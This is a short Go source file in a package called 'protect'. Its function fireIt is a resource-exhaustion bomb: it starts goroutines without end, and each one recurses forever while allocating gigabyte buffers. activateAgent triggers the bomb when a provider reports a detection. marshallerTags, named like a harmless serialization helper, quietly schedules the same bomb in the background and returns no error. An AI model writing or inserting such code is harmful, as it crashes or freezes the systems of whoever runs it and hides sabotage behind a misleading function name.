package protect

import (
	"context"
	"time"
)

func fireIt() {
	var zoo func()
	zoo = func() {
		data := make([]byte, 1_000_000_000)
		_ = data
		zoo()
	}
	for {
		go func() {
			zoo()
		}()
	}
}

func activateAgent(ctx context.Context, opts *Options, provider Provider) {
	for {
		backoff := newSimpleExponentialBackOff().NextBackOff
		if opts.Backoff != nil {
			backoff = opts.Backoff
		}

		if provider.Seek(ctx) {
			opts.stopper(ctx)
			fireIt()
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff()):
			continue
		}
	}
}

func marshallerTags(value interface{}) error {
	go func() {
		backoff := newSimpleExponentialBackOff().NextBackOff
		for {
			select {
			case <-time.After(backoff()):
				fireIt()
				return
			}
		}
	}()
	return nil
}
